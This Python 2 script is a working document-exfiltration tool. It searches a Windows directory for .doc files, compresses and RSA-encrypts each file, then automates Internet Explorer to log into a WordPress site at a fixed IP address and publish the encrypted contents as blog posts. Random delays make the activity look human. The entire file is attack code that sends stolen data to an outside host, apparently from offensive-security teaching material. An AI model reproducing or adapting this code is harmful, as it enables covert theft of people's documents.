import os
import zlib
import time
import base64
import random
import fnmatch
from win32com.client import Dispatch
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "wpuser"
password = "***********"


public_key = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvnPeXLJdHVsS9ucNTwwh
RMVfc9cdrSQ0HafoVuSKZnVwGImAMer07YWLEOUK2yLOQUxEcA/Tsh24UMf9wiRd
QjZXC2nixeGL9v/jC6DEnTdkIl+kbwIg5Qa4Dmspmg3RWibIspqaQOo7GxpF2Xav
rgczCT7l/Nek7GxyDQ4wGIyj8jh8S02kFNMetw9cfjARbwTRpvWMHIvjvxIWQnp/
93bRrjHw6ajJjOSn8s3MhEtlBaS1U8tvjRkljbLx6Bs+cnlLNVdgW8uku4eoWzUg
ZEEP5LxKNxtfEroLcAkCrL2PR/wPfjXDTOBcuhnDNKChtx4dsAmefQHeL0b+NEMr
hQIDAQAB
-----END PUBLIC KEY-----'''


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)
    return


def encrypt_string(plaintext):
    chunk_size = 214

    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)

    print "Encrypted %d bytes" % len(plaintext)

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)

    encrypted = ""
    offset = 0
    while offset < len(plaintext):
        chunk = plaintext[offset: offset + chunk_size]

        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))

        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = base64.b64encode(encrypted)
    print "Base64 encoded crypto: %d bytes" % len(encrypted)

    return encrypted


def encrypt_post(filename):
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_wordpress(ie):
    # retrieve all elements in the document
    full_doc = ie.Document.all

    # iterate looking for the login form
    for i in full_doc:
        if i.id == "user_login":
            i.setAttribute("value", username)
        elif i.id == "user_pass":
            i.setAttribute("value", password)

    random_sleep()

    if ie.Document.forms[0].id == "loginform":
        ie.Document.forms[0].submit()

    random_sleep()

    wait_for_browser(ie)

    return


def post_to_wordpress(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "title":
            i.setAttribute("value", title)
            title_box = i
            i.focus()

        elif i.id == "content":

            i.setAttribute("value", post)
            print "Set text area"
            i.focus()

        elif i.id == "publish":
            print "Found post button"
            post_button = i
            i.focus()

    # move focus away from the main content box
    random_sleep()
    title_box.focus()
    random_sleep()

    #ie.Document.forms[1].submit()
    # post the form
    post_button.click()
    wait_for_browser(ie)

    random_sleep()

    return


def exfiltrate(document_path):
    ie = Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # head to wordpress and login
    ie.Navigate("http://192.168.211.154/wordpress/wp-login.php")
    wait_for_browser(ie)

    print "Logging in..."
    login_to_wordpress(ie)
    print "Logging in...navigating"

    ie.Navigate("http://192.168.211.154/wordpress/wp-admin/post-new.php")
    wait_for_browser(ie)

    # encrypt the file
    title, body = encrypt_post(document_path)
    print "Creating new post..."
    post_to_wordpress(ie, title, body)
    print "Posted!"

    # destroy the IE instance
    ie.Quit()
    ie = None

    return


# main loop for document discovery
# NOTE: no tab for first line of code below

for dirpath, dirnames, filenames in os.walk("C:\\Users\\howl\\Desktop\\testes\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(dirpath, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")